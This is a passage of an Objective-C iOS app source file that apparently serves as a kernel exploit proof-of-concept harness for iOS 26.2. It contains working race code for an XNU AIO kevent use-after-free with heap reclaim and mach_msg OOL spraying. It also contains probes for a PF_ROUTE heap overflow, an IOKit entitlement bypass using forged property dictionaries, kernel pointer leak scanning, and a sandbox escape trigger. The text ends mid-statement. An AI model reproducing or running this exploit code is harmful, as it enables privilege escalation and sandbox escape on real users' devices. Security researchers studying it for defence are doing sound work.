//
//  ViewController.m
//  TestPOC
//
//  Created by Johnny Franks on 2/12/26.
//

#import "ViewController.h"
#import <dlfcn.h>
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <mach/mach_error.h>
#import <mach/vm_map.h>
#import <math.h>
#import <sched.h>
#import <stdatomic.h>
#import <stdio.h>
#import <sys/time.h>
#import <unistd.h>
#include <aio.h>
#include <errno.h>
#include <string.h>
#include <sys/event.h>
#include <mach/thread_policy.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/sysctl.h>
#include <dirent.h>
#include <sys/stat.h>

// getattrlistbulk — private API on iOS, resolve via dlsym
#define ATTR_BULK_REQD      0x00000080
#define ATTR_CMN_NAME       0x00000001
#define ATTR_CMN_OBJTYPE    0x00000002
#define ATTR_CMN_RETURNED_ATTRS 0x80000000
#define ATTR_DIR_ENTRYCOUNT 0x00000040
#define FSOPT_PACK_ATTRS    0x00000004

struct attrlist {
    u_short bitmapcount;
    u_short reserved;
    u_int commonattr;
    u_int volattr;
    u_int dirattr;
    u_int fileattr;
    u_int forkattr;
};
typedef int (*GetAttrListBulkFn)(int, struct attrlist *, void *, size_t, uint64_t);

// proc_pidinfo — not in iOS SDK headers, resolve via dlsym
typedef int (*ProcPidinfoFn)(int pid, int flavor, uint64_t arg, void *buffer, uint32_t buffersize);
typedef int (*ProcListPidsFn)(uint32_t type, uint32_t typeinfo, void *buffer, int buffersize);
typedef int (*ProcPidfdinfoFn)(int pid, int fd, int flavor, void *buffer, int buffersize);

// proc_* structures and constants (not in public iOS SDK)
#define PROC_ALL_PIDS           1
#define PROC_PIDT_SHORTBSDINFO  13
#define PROC_PIDLISTFDS          1
#define PROC_PIDFDVNODEPATHINFO  2
#define MAXCOMLEN               16

struct proc_bsdshortinfo {
    uint32_t pbsi_pid;
    uint32_t pbsi_ppid;
    uint32_t pbsi_pgid;
    uint32_t pbsi_status;
    char     pbsi_comm[MAXCOMLEN];
    uint32_t pbsi_flags;
    uid_t    pbsi_uid;
    gid_t    pbsi_gid;
    uid_t    pbsi_ruid;
    gid_t    pbsi_rgid;
    uid_t    pbsi_svuid;
    gid_t    pbsi_svgid;
    uint32_t pbsi_rfu;
};

struct proc_fdinfo {
    int32_t  proc_fd;
    uint32_t proc_fdtype;
};

struct vnode_fdinfowithpath {
    uint32_t len;
    uint32_t type;
    char     path[1024];
};

// ---------- IOKit type / function-pointer plumbing ----------

typedef mach_port_t io_object_t;
typedef io_object_t io_service_t;
typedef io_object_t io_connect_t;
typedef io_object_t io_iterator_t;

typedef CFMutableDictionaryRef (*IOServiceMatchingFn)(const char *name);
typedef io_service_t (*IOServiceGetMatchingServiceFn)(mach_port_t mainPort, CFDictionaryRef matching);
typedef kern_return_t (*IOServiceGetMatchingServicesFn)(mach_port_t mainPort, CFDictionaryRef matching, io_iterator_t *existing);
typedef kern_return_t (*IOServiceOpenFn)(io_service_t service, task_port_t owningTask, uint32_t type, io_connect_t *connect);
typedef kern_return_t (*IOServiceCloseFn)(io_connect_t connect);
typedef kern_return_t (*IOObjectReleaseFn)(io_object_t object);
typedef io_object_t   (*IOIteratorNextFn)(io_iterator_t iterator);
typedef kern_return_t (*IOConnectCallMethodFn)(
    io_connect_t connection, uint32_t selector,
    const uint64_t *input, uint32_t inputCnt,
    const void *inputStruct, size_t inputStructCnt,
    uint64_t *output, uint32_t *outputCnt,
    void *outputStruct, size_t *outputStructCnt);
typedef kern_return_t (*IOConnectMapMemoryFn)(
    io_connect_t connect, uint32_t memoryType,
    task_port_t intoTask, mach_vm_address_t *atAddress,
    mach_vm_size_t *ofSize, uint32_t options);
typedef kern_return_t (*IOConnectUnmapMemoryFn)(
    io_connect_t connect, uint32_t memoryType,
    task_port_t fromTask, mach_vm_address_t atAddress);
typedef kern_return_t (*IORegistryEntryGetRegistryEntryIDFn)(
    io_object_t entry, uint64_t *entryID);
typedef CFStringRef (*IOObjectCopyClassFn)(io_object_t object);
typedef kern_return_t (*IORegistryEntryGetNameFn)(io_object_t entry, char name[128]);
typedef kern_return_t (*IOConnectGetServiceFn)(io_connect_t connect, io_service_t *service);
typedef kern_return_t (*IORegistryEntryCreateCFPropertiesFn)(
    io_object_t entry, CFMutableDictionaryRef *properties, CFAllocatorRef allocator, uint32_t options);
typedef CFTypeRef (*SecTaskCreateFromSelfFn)(CFAllocatorRef allocator);
typedef CFTypeRef (*SecTaskCopyValueForEntitlementFn)(CFTypeRef task, CFStringRef entitlement, CFErrorRef *error);

static void *sIOKitHandle = NULL;
static IOServiceMatchingFn            sIOServiceMatching            = NULL;
static IOServiceGetMatchingServiceFn  sIOServiceGetMatchingService  = NULL;
static IOServiceGetMatchingServicesFn sIOServiceGetMatchingServices = NULL;
static IOServiceOpenFn                sIOServiceOpen                = NULL;
static IOServiceCloseFn               sIOServiceClose               = NULL;
static IOObjectReleaseFn              sIOObjectRelease              = NULL;
static IOIteratorNextFn               sIOIteratorNext               = NULL;
static IOConnectCallMethodFn          sIOConnectCallMethod          = NULL;
static IOConnectMapMemoryFn           sIOConnectMapMemory64         = NULL;
static IOConnectUnmapMemoryFn         sIOConnectUnmapMemory64       = NULL;
static IORegistryEntryGetRegistryEntryIDFn sIORegistryEntryGetRegistryEntryID = NULL;
static IOObjectCopyClassFn                sIOObjectCopyClass                = NULL;
static IORegistryEntryGetNameFn           sIORegistryEntryGetName           = NULL;
static IOConnectGetServiceFn              sIOConnectGetService              = NULL;
static IORegistryEntryCreateCFPropertiesFn sIORegistryEntryCreateCFProperties = NULL;
static void *sSecurityHandle = NULL;
static SecTaskCreateFromSelfFn sSecTaskCreateFromSelf = NULL;
static SecTaskCopyValueForEntitlementFn sSecTaskCopyValueForEntitlement = NULL;


// ---------- Constants ----------

// Selector indices from the FastPathUserClient dispatch table
static const uint32_t kSelectorOpen      = 0;
static const uint32_t kSelectorClose     = 1;
static const uint32_t kSelectorCopyEvent = 2;

// IOConnectMapMemory type (try type 0 for the event buffer)
static const uint32_t kMemoryTypeEventBuffer = 0;

#define kEventOutputBufferSize 4096U

// Cap for mapped-buffer probe window — never touch more than this.
enum { kMappedProbeMaxBytes = 4096 };
static const size_t kMappedProbeMax = kMappedProbeMaxBytes;
static const size_t kCrossClientSampleBytes = 192;

// ---------- Serialised properties payload ----------
// The fast-path gate (sub_FFFFFE000A6AD844) calls getObject() on the
// *caller-supplied* OSDictionary for these two keys.  If both keys are
// present the gate passes and openForClient is invoked on the provider.
//
// The actual entitlement flags stored during initWithTask are loaded
// but do NOT control the branch – this is the authorization inconsistency
// we are boundary-testing.

static const char kOpenPropertiesXML[] =
    "<dict>"
        "<key>FastPathHasEntitlement</key><true/>"
        "<key>FastPathMotionEventEntitlement</key><true/>"
    "</dict>";

static const char kOpenPropertiesXMLEmpty[] =
    "<dict></dict>";

static const char kOpenPropertiesXMLOneKey[] =
    "<dict>"
        "<key>FastPathHasEntitlement</key><true/>"
    "</dict>";

// Negative controls that should fail if selector 0 truly requires valid caller props.
static const char kOpenPropertiesMalformedXML[] =
    "<dict><key>FastPathHasEntitlement</key><true/>";

static const char kOpenPropertiesGarbage[] =
    "THIS_IS_NOT_XML";

// ---------- ViewController ----------

@interface ViewController () {
    io_connect_t _persistedConnection;
    io_service_t _persistedService;
}
@property (nonatomic, strong) UIButton   *triggerButton;
@property (nonatomic, strong) UIButton   *deepProbeButton;
@property (nonatomic, strong) UIButton   *lifecycleButton;
@property (nonatomic, strong) UIButton   *aioUafButton;
@property (nonatomic, strong) UIButton   *pfRouteProbeButton;
@property (nonatomic, assign) int         pfRoutePhase;
@property (nonatomic, strong) UIButton   *iohidUAFButton;
@property (nonatomic, strong) UIButton   *sandboxEscapeButton;
@property (nonatomic, strong) UITextView *logView;
@property (nonatomic, assign) int  proofCrossClientEvents;
@property (nonatomic, assign) int  proofCrossClientChecks;
@property (nonatomic, assign) int  proofTerminationProbes;
@property (nonatomic, assign) int  proofTerminationOpenCycles;
@property (nonatomic, assign) BOOL proofCrossClientSignal;
@property (nonatomic, assign) BOOL proofTermRaceActive;
@property (nonatomic, assign) BOOL proofHashChanged;
@property (nonatomic, assign) BOOL proofKernelPointerPatterns;
@property (nonatomic, assign) double proofEntropyDelta;
@property (nonatomic, assign) int proofFirstCrossClientConn;
@property (nonatomic, assign) uint32_t proofFirstCrossClientEventSize;
@property (nonatomic, strong) NSString *proofFirstCrossClientHex;
@property (nonatomic, strong) NSString *proofArtifactPath;
@property (nonatomic, assign) BOOL proofKernelPointerLeak;
@property (nonatomic, assign) uint64_t proofKernelPointerValue;
@property (nonatomic, assign) int proofKernelPointerOffset;
@property (nonatomic, assign) int proofKernelPointerSourceConn;
@property (nonatomic, strong) NSString *proofKernelPointerHex;
@property (nonatomic, assign) int proofPrimaryScanCount;
@property (nonatomic, assign) int proofPrimaryLeakCount;
@property (nonatomic, assign) int proofZoneFreePatternHits;
@property (nonatomic, assign) int proofUninitLeaks;
@property (nonatomic, assign) int proofReadAfterCloseLeaks;
@property (nonatomic, assign) int proofRemapAfterFreeLeaks;
@property (nonatomic, assign) uint64_t leakedKernelAddr;
- (void)clearLifecyclePocState;
- (void)appendPocArtifactEntry:(NSDictionary *)entry;
- (BOOL)isLikelyKernelPointerValue:(uint64_t)value;
- (BOOL)isZeroFilled:(const uint8_t *)bytes length:(size_t)length;
- (BOOL)findCollectionChildChainStart:(const uint8_t *)base
                            totalSize:(size_t)totalSize
                             outStart:(size_t *)outStart
                        outChildCount:(int *)outChildCount
                          outCoverage:(size_t *)outCoverage;
- (BOOL)parseSPUCollectionFrame:(const uint8_t *)eventBytes
                      eventSize:(size_t)eventSize
                     outSummary:(NSString **)outSummary;
- (void)runPhase4BroadServiceEnumeration;
- (void)runPhase5MappedMemoryBoundsAudit:(io_connect_t)connection
                              mappedAddr:(mach_vm_address_t)mappedAddr
                              mappedSize:(mach_vm_size_t)mappedSize;
- (void)runPhase6ExtendedSelectorProbing:(io_connect_t)connection;
- (void)runPhase7RegistryPropertyTraversal:(io_connect_t)connection;
- (void)runPhase8ConnectionPortAnalysis:(io_connect_t)connection;
- (NSString *)labelForService:(io_service_t)service
                     outClass:(NSString **)outClass
                      outName:(NSString **)outName
                  outEntryID:(uint64_t *)outEntryID;
- (NSString *)cfTypeName:(CFTypeRef)value;
- (double)shannonEntropyForBytes:(const uint8_t *)bytes length:(size_t)length;
- (void)runBaselineScan:(io_connect_t)connection
                mappedAddr:(mach_vm_address_t)mappedAddr
                mappedSize:(mach_vm_size_t)mappedSize;
- (int)openMultipleGatedConnections:(io_connect_t *)outConns
                           maxCount:(int)maxCount
                         outService:(io_service_t *)outService;
- (void)runLifecycleDesyncStress:(io_connect_t *)connections
                           count:(int)connCount
                      mappedAddr:(mach_vm_address_t)mappedAddr
                      mappedSize:(mach_vm_size_t)mappedSize
                   auxMappings:(mach_vm_address_t *)auxMappedAddrs
                 auxMappedSizes:(mach_vm_size_t *)auxMappedSizes
                    raceService:(io_service_t)raceService;
- (void)runPostStressStructuralAnalysis:(io_connect_t)connection
                    mappedAddr:(mach_vm_address_t)mappedAddr
                    mappedSize:(mach_vm_size_t)mappedSize
                   preSnapshot:(NSData *)preSnapshot;
- (void)runPostLifecycleFingerprint:(io_connect_t)connection
                         mappedAddr:(mach_vm_address_t)mappedAddr
                         mappedSize:(mach_vm_size_t)mappedSize
                        preEntropy:(double)preEntropy
                           preHash:(uint64_t)preHash
                   primaryScanCount:(int)primaryScanCount
                   primaryLeakCount:(int)primaryLeakCount;
- (NSArray<NSDictionary *> *)scanForKernelPointers:(const uint8_t *)base
                                            length:(size_t)length
                                        maxResults:(int)maxResults
                                         connIndex:(int)connIndex;
- (BOOL)isZoneFreePattern:(uint64_t)value;
- (int)scanForZoneFreePatterns:(const uint8_t *)base length:(size_t)length;
- (void)runReadAfterCloseProbe:(io_connect_t *)connections
                         count:(int)connCount
                    mappedAddr:(mach_vm_address_t)mappedAddr
                    mappedSize:(mach_vm_size_t)mappedSize
                   raceService:(io_service_t)raceService;
- (void)runUninitBufferProbe:(io_service_t)raceService;
- (void)runRemapAfterFreeProbe:(io_service_t)raceService;
- (void)pfRouteProbeTapped;
- (void)runPFRouteProbe;
- (void)iohidUAFTapped;
- (void)runIOHIDUAFProbe;
- (void)sandboxEscapeTapped;
@end

// =======================================================================
// CVE-2026-20698: PF_ROUTE RTA_GENMASK Heap Overflow
// Target: iOS 26.2 (xnu-12377.62.10), iPhone 13 (A15)
// v1 — Phase 1: Vulnerability Probe
// =======================================================================
// COMPLETELY INDEPENDENT from AIO UAF (CVE-2026-XNU-AIO-KEVENT-UAF).
// No shared state, no shared threads, no shared kqueue/fd resources.
// Isolation: separate button, separate dispatch queue, separate file I/O.
// =======================================================================

#define RTM_VERSION   5
#define RTM_GET       4
#define RTA_DST       0x01
#define RTA_GATEWAY   0x02
#define RTA_NETMASK   0x04
#define RTA_GENMASK   0x08
#define RTA_IFP       0x10
#define RTA_IFA       0x20
#define RTA_AUTHOR    0x40
#define RTA_BRD       0x80

struct pf_rt_metrics {
    uint32_t rmx_locks, rmx_mtu, rmx_hopcount;
    int32_t  rmx_expire;
    uint32_t rmx_recvpipe, rmx_sendpipe, rmx_ssthresh;
    uint32_t rmx_rtt, rmx_rttvar, rmx_pksent, rmx_state;
    uint32_t rmx_filler[3];
};

struct pf_rt_msghdr {
    unsigned short rtm_msglen;
    unsigned char  rtm_version;
    unsigned char  rtm_type;
    unsigned short rtm_index;
    int            rtm_flags;
    int            rtm_addrs;
    int            rtm_pid;
    int            rtm_seq;
    int            rtm_errno;
    int            rtm_use;
    unsigned int   rtm_inits;
    struct pf_rt_metrics rtm_rmx;
};

// ---- XNU AIO Kevent UAF helpers ----
// CVE-2026-XXXX: Double-free in kern_aio.c, patched in iOS 26.3.
// CPU-affinity LIFO reclaim: same-thread free+realloc reuses slot ~70%.

#ifndef SIGEV_KEVENT
#define SIGEV_KEVENT 4
#endif
#define AIO_NRECLAIM 7   // 7 reclaim + 1 trigger = 8 (per-process AIO limit). Leave margin.

struct aio_race_state {
    atomic_bool start, stop;
    atomic_int freed;
    atomic_bool reclaim_done;
    struct aiocb *trigger;
    struct aiocb *rcbs;
    int nrcbs;
    ssize_t return_result;  // v47: aio_return result or aio_read errno (diagnostics)
};

// v78: v63 base + SIGEV_KEVENT on rcbs[0] (same kqueue).
// Root cause of ALL v45-v77 FAR=0x58 crashes: SIGEV_NONE reclaim entries
// have refcount=1 → worker unref drops to 0 → zfree zeros entry (procp=NULL).
// FIX: rcbs[0] uses SIGEV_KEVENT on kq → refcount=2 → worker unref 2→1 →
// entry stays ALIVE with valid procp. kevent64 triggers safe TAILQ_REMOVE.
// close(kq) → filt_aiodetach → refcount 0 → entry freed safely.

#define V63_NRECLAIM 7

struct v63_race_state {
    atomic_bool start, stop;
    atomic_int freed;          // 0=spinning, 1=lost, 2=won
    atomic_bool reclaim_done;
    struct aiocb *trigger;
    struct aiocb *rcbs;
    int nrcbs;
    int kq;                    // v78: kqueue for rcbs[0] SIGEV_KEVENT
    ssize_t return_result;
};

struct v63_state {
    int fd;                    // single file for all AIO operations
    int kq;
    int kq2;                   // v64: second kqueue for rcbs[0]'s knote
    struct kevent64_s kev;
    struct kevent64_s kev2;    // v65: Phase B kevent result
    int nev;
    int nev2;                  // v65: Phase B kevent count
    int err;
    int freed;
    int reclaimed;
    ssize_t return_result;
    char diag_path[512];
};

// v19: E2 racer state — aio_return frees E2's slot, OOL spray reclaims it.
// kevent64's dangling knote then reads OOL data through entry struct offsets.
struct e2_ool_race_state {
    atomic_bool start, stop;
    atomic_bool freed;
    atomic_bool ool_sent;
    struct aiocb *e2;
    void *payload;
    int oolSize;
    mach_port_t oolPort;
};

static void aio_set_thread_affinity(int tag) {
    thread_affinity_policy_data_t pol = { .affinity_tag = tag };
    thread_policy_set(mach_thread_self(), THREAD_AFFINITY_POLICY,
                      (thread_policy_t)&pol, THREAD_AFFINITY_POLICY_COUNT);
}

// v63 racer: spins aio_return directly, reclaims via lio_listio BATCH
// (single syscall for all 7 entries — minimizes alien zalloc window
// between tcb's zfree and rcbs[0]'s zalloc). No thread precedence.
// kevent64 is NOT called here — it's on the exploit thread.
static void *v63_racer(void *arg) {
    struct v63_race_state *s = (struct v63_race_state *)arg;
    aio_set_thread_affinity(42);

    while (!atomic_load_explicit(&s->start, memory_order_acquire));

    while (!atomic_load_explicit(&s->stop, memory_order_relaxed)) {
        ssize_t ret = aio_return(s->trigger);
        if (ret >= 0) {
            s->return_result = ret;
            atomic_store_explicit(&s->freed, 2, memory_order_release);
            if (s->rcbs && s->nrcbs > 0) {
                // v63: lio_listio batch reclaim — all zallocs in one syscall,
                // minimizing the window for alien zallocs to steal tcb from
                // the magazine top. This replaces the sequential aio_read loop
                // where 5-6 alien entries were stolen between each call.
                struct aiocb *list[V63_NRECLAIM];
                for (int i = 0; i < s->nrcbs; i++) list[i] = &s->rcbs[i];
                struct sigevent sig = {};
                sig.sigev_notify = SIGEV_NONE;
                if (lio_listio(LIO_NOWAIT, list, s->nrcbs, &sig) == 0)
                    atomic_store_explicit(&s->reclaim_done, true, memory_order_release);
                else
                    s->return_result = (ssize_t)errno;
            }
            return NULL;
        }
    }
    atomic_store_explicit(&s->freed, 1, memory_order_release);
    return NULL;
}

// v78 racer: Like v63, but rcbs[0] submitted via aio_read with its pre-configured
// SIGEV_KEVENT on kq (refcount stays at 1 after worker unref → entry NOT freed).
// rcbs[1..6] submitted via lio_listio batch (SIGEV_NONE). This eliminates the
// zfree-zeroes-procp fundamental crash cause — the knote holds a reference.
static void *v78_racer(void *arg) {
    struct v63_race_state *s = (struct v63_race_state *)arg;
    aio_set_thread_affinity(42);

    while (!atomic_load_explicit(&s->start, memory_order_acquire));

    while (!atomic_load_explicit(&s->stop, memory_order_relaxed)) {
        ssize_t ret = aio_return(s->trigger);
        if (ret >= 0) {
            s->return_result = ret;
            atomic_store_explicit(&s->freed, 2, memory_order_release);
            if (s->rcbs && s->nrcbs > 0) {
                // v78: rcbs[0] via aio_read — uses its pre-configured SIGEV_KEVENT on kq.
                // Knote holds refcount → worker unref drops 2→1 → entry stays alive.
                aio_read(&s->rcbs[0]);

                // rcbs[1..6] via lio_listio batch (SIGEV_NONE, same as v63).
                if (s->nrcbs > 1) {
                    struct aiocb *list[V63_NRECLAIM - 1];
                    for (int i = 1; i < s->nrcbs; i++) list[i-1] = &s->rcbs[i];
                    struct sigevent sig = {};
                    sig.sigev_notify = SIGEV_NONE;
                    lio_listio(LIO_NOWAIT, list, s->nrcbs - 1, &sig);
                }
                atomic_store_explicit(&s->reclaim_done, true, memory_order_release);
            }
            return NULL;
        }
    }
    atomic_store_explicit(&s->freed, 1, memory_order_release);
    return NULL;
}

// v78: Same as v63/v77 but rcbs[0] uses SIGEV_KEVENT on the SAME kqueue.
// This is the FUNDAMENTAL FIX: with SIGEV_KEVENT, refcount starts at 2.
// Worker unref drops 2→1 (knote holds ref) → entry stays ALIVE on doneq
// with valid procp. kevent64 fires → TAILQ_REMOVE from doneq → safe.
// close(kq) → filt_aiodetach → aio_entry_unref → refcount 0 → zfree.
// v64 proved dual TAILQ_REMOVE on same entry doesn't crash.
static void *v78_exploit_thread(void *arg) {
    struct v63_state *st = (struct v63_state *)arg;
    aio_set_thread_affinity(42);

    // 7x Zone priming (v63 original).
    struct aiocb pcbs[7];
    char pbufs[7][256];
    for (int i = 0; i < 7; i++) {
        memset(&pcbs[i], 0, sizeof(pcbs[i]));
        pcbs[i].aio_fildes = st->fd;
        pcbs[i].aio_buf = pbufs[i];
        pcbs[i].aio_nbytes = 1;
        pcbs[i].aio_offset = 0;
        pcbs[i].aio_lio_opcode = LIO_READ;
        pcbs[i].aio_sigevent.sigev_notify = SIGEV_NONE;
        aio_read(&pcbs[i]);
    }
    for (int i = 0; i < 7; i++) {
        while (aio_error(&pcbs[i]) == EINPROGRESS) usleep(100);
        aio_return(&pcbs[i]);
    }

    // Single kqueue.
    int kq = kqueue();
    if (kq < 0) { st->err = errno; return NULL; }

    // tcb with SIGEV_KEVENT on kq.
    struct aiocb tcb;
    char tbuf[4096];
    memset(&tcb, 0, sizeof(tcb));
    tcb.aio_fildes = st->fd;
    tcb.aio_buf = tbuf;
    tcb.aio_nbytes = sizeof(tbuf);
    tcb.aio_offset = 0;
    tcb.aio_lio_opcode = LIO_READ;
    tcb.aio_sigevent.sigev_notify = SIGEV_KEVENT;
    tcb.aio_sigevent.sigev_signo = kq;

    // v78: rcbs[0] uses SIGEV_KEVENT on kq — knote holds ref, entry never freed.
    // rcbs[1..6] SIGEV_NONE as before. Unique nbytes 8192+i for victim ID.
    struct aiocb rcbs[V63_NRECLAIM];
    char rbufs[V63_NRECLAIM][8256];
    for (int i = 0; i < V63_NRECLAIM; i++) {
        memset(&rcbs[i], 0, sizeof(rcbs[i]));
        rcbs[i].aio_fildes = st->fd;
        rcbs[i].aio_buf = rbufs[i];
        rcbs[i].aio_nbytes = 8192 + i;
        rcbs[i].aio_offset = 0;
        rcbs[i].aio_lio_opcode = LIO_READ;
        rcbs[i].aio_sigevent.sigev_notify = (i == 0) ? SIGEV_KEVENT : SIGEV_NONE;
        rcbs[i].aio_sigevent.sigev_signo = (i == 0) ? kq : 0;
    }

    // Submit tcb via lio_listio.
    struct aiocb *ptr = &tcb;
    struct sigevent sig = {};
    sig.sigev_notify = SIGEV_NONE;
    lio_listio(LIO_NOWAIT, &ptr, 1, &sig);

    // Start v78 racer.
    struct v63_race_state rs = {};
    rs.trigger = &tcb;
    rs.rcbs = rcbs;
    rs.nrcbs = V63_NRECLAIM;
    rs.kq = kq;  // v78: racer needs kq for rcbs[0] knote

    pthread_t thr;
    pthread_create(&thr, NULL, v78_racer, &rs);
    atomic_store_explicit(&rs.start, true, memory_order_release);

    usleep(500);  // 500us racer timeout
    atomic_store_explicit(&rs.stop, true, memory_order_release);
    pthread_join(thr, NULL);

    int freed = atomic_load(&rs.freed);
    bool reclaimed = atomic_load(&rs.reclaim_done);
    ssize_t ret_result = rs.return_result;
    st->freed = freed;
    st->reclaimed = reclaimed ? V63_NRECLAIM : 0;
    st->return_result = ret_result;

    if (freed != 2) {
        while (aio_error(&tcb) == EINPROGRESS) usleep(500);
        aio_return(&tcb);
        close(kq);
        return NULL;
    }

    if (!reclaimed) {
        close(kq);
        return NULL;
    }

    // Wait for ALL reclaim entries to complete.
    // rcbs[0] (SIGEV_KEVENT, refcount=2): worker unref drops to 1 → entry ALIVE.
    // rcbs[1..6] (SIGEV_NONE, refcount=1): worker unref drops to 0 → freed.
    for (int i = 0; i < V63_NRECLAIM; i++)
        while (aio_error(&rcbs[i]) == EINPROGRESS) usleep(500);

    // kevent64 on kq — two knotes point to same memory (stale tcb + fresh rcbs[0]).
    // First knote (tcb, stale): entry is rcbs[0]'s data, on doneq with valid procp
    //   → TAILQ_REMOVE safe → posts event → rcbs[0]'s knote still holds ref.
    // Second knote (rcbs[0], fresh): also on doneq? Already removed. Returns 0.
    struct kevent64_s kev = {};
    struct timespec ts = {10, 0};
    st->nev = kevent64(kq, NULL, 0, &kev, 1, 0, &ts);
    if (st->nev > 0) st->kev = kev;

    close(kq);  // filt_aiodetach → aio_entry_unref on both knotes → entry freed

    // Smart cleanup (same as v63/v77).
    if (st->nev > 0) {
        uint64_t victim_nbytes = st->kev.ext[1];
        for (int i = 0; i < V63_NRECLAIM; i++) {
            uint64_t my_nbytes = 8192 + i;
            if (victim_nbytes == my_nbytes) continue;
            if (aio_error(&rcbs[i]) != EINVAL)
                aio_return(&rcbs[i]);
        }
    } else {
        for (int i = 0; i < V63_NRECLAIM; i++) {
            if (aio_error(&rcbs[i]) != EINVAL)
                aio_return(&rcbs[i]);
        }
    }

    return NULL;
}

// v19: Racer that frees E2's slot via aio_return then immediately reclaims
// the same slot with an OOL message (mach_msg PHYSICAL_COPY → kalloc.256).
// Same CPU-affinity LIFO mechanism as Phase A, but OOL data replaces AIO entry data.
// kevent64's dangling knote pointer reads the OOL payload through entry field offsets.
static void *e2_free_and_ool_racer(void *arg) {
    struct e2_ool_race_state *s = (struct e2_ool_race_state *)arg;
    aio_set_thread_affinity(42);
    while (!atomic_load_explicit(&s->start, memory_order_acquire));
    while (!atomic_load_explicit(&s->stop, memory_order_relaxed)) {
        if (aio_error(s->e2) == 0) {
            ssize_t r = aio_return(s->e2);
            if (r >= 0) {
                atomic_store_explicit(&s->freed, true, memory_order_release);
                typedef struct {
                    mach_msg_header_t header;
                    mach_msg_body_t body;
                    mach_msg_ool_descriptor_t ool;
                } OolMsg;
                OolMsg msg;
                memset(&msg, 0, sizeof(msg));
                msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
                msg.header.msgh_size = sizeof(msg);
                msg.header.msgh_remote_port = s->oolPort;
                msg.header.msgh_id = 0xE200;
                msg.body.msgh_descriptor_count = 1;
                msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
                msg.ool.address = s->payload;
                msg.ool.size = s->oolSize;
                msg.ool.deallocate = FALSE;
                msg.ool.copy = MACH_MSG_PHYSICAL_COPY;
                if (mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL) == MACH_MSG_SUCCESS) {
                    atomic_store_explicit(&s->ool_sent, true, memory_order_release);
                }
                return NULL;
            }
        }
    }
    return NULL;
}

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    [self setupUI];
}

// ---- UI boilerplate ----

- (void)setupUI {
    self.view.backgroundColor = [UIColor systemBackgroundColor];

    self.lifecycleButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.lifecycleButton.translatesAutoresizingMaskIntoConstraints = NO;
    UIButtonConfiguration *conf = [UIButtonConfiguration filledButtonConfiguration];
    conf.baseBackgroundColor = [UIColor systemRedColor];
    self.lifecycleButton.configuration = conf;
    [self.lifecycleButton setTitle:@"Trigger UAF" forState:UIControlStateNormal];
    [self.lifecycleButton addTarget:self action:@selector(lifecycleBoundaryTapped) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.lifecycleButton];

    self.aioUafButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.aioUafButton.translatesAutoresizingMaskIntoConstraints = NO;
    UIButtonConfiguration *aioConf = [UIButtonConfiguration filledButtonConfiguration];
    aioConf.baseBackgroundColor = [UIColor systemOrangeColor];
    self.aioUafButton.configuration = aioConf;
    [self.aioUafButton setTitle:@"AIO UAF v78" forState:UIControlStateNormal];
    [self.aioUafButton addTarget:self action:@selector(aioUafTapped) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.aioUafButton];

    self.pfRouteProbeButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.pfRouteProbeButton.translatesAutoresizingMaskIntoConstraints = NO;
    UIButtonConfiguration *pfConf = [UIButtonConfiguration filledButtonConfiguration];
    pfConf.baseBackgroundColor = [UIColor systemGreenColor];
    self.pfRouteProbeButton.configuration = pfConf;
    [self.pfRouteProbeButton setTitle:@"CVE-2026-20698 v3 Leak Probe" forState:UIControlStateNormal];
    [self.pfRouteProbeButton addTarget:self action:@selector(pfRouteProbeTapped) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.pfRouteProbeButton];

    self.iohidUAFButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.iohidUAFButton.translatesAutoresizingMaskIntoConstraints = NO;
    UIButtonConfiguration *iohidConf = [UIButtonConfiguration filledButtonConfiguration];
    iohidConf.baseBackgroundColor = [UIColor systemPurpleColor];
    self.iohidUAFButton.configuration = iohidConf;
    [self.iohidUAFButton setTitle:@"CVE-2026-28992 Arg Probe v3" forState:UIControlStateNormal];
    [self.iohidUAFButton addTarget:self action:@selector(iohidUAFTapped) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.iohidUAFButton];

    self.sandboxEscapeButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.sandboxEscapeButton.translatesAutoresizingMaskIntoConstraints = NO;
    UIButtonConfiguration *sbConf = [UIButtonConfiguration filledButtonConfiguration];
    sbConf.baseBackgroundColor = [UIColor systemTealColor];
    self.sandboxEscapeButton.configuration = sbConf;
    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v33" forState:UIControlStateNormal];
    [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.sandboxEscapeButton];

    self.logView = [[UITextView alloc] initWithFrame:CGRectZero];
    self.logView.translatesAutoresizingMaskIntoConstraints = NO;
    self.logView.editable = NO;
    self.logView.font = [UIFont monospacedSystemFontOfSize:12.0 weight:UIFontWeightRegular];
    self.logView.backgroundColor = [UIColor secondarySystemBackgroundColor];
    self.logView.text = @"UAF PoC\nPress Trigger UAF to begin.\n";
    [self.view addSubview:self.logView];

    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [self.lifecycleButton.topAnchor constraintEqualToAnchor:safe.topAnchor constant:20],
        [self.lifecycleButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
        [self.lifecycleButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
        [self.aioUafButton.topAnchor constraintEqualToAnchor:self.lifecycleButton.bottomAnchor constant:12],
        [self.aioUafButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
        [self.aioUafButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
        [self.pfRouteProbeButton.topAnchor constraintEqualToAnchor:self.aioUafButton.bottomAnchor constant:12],
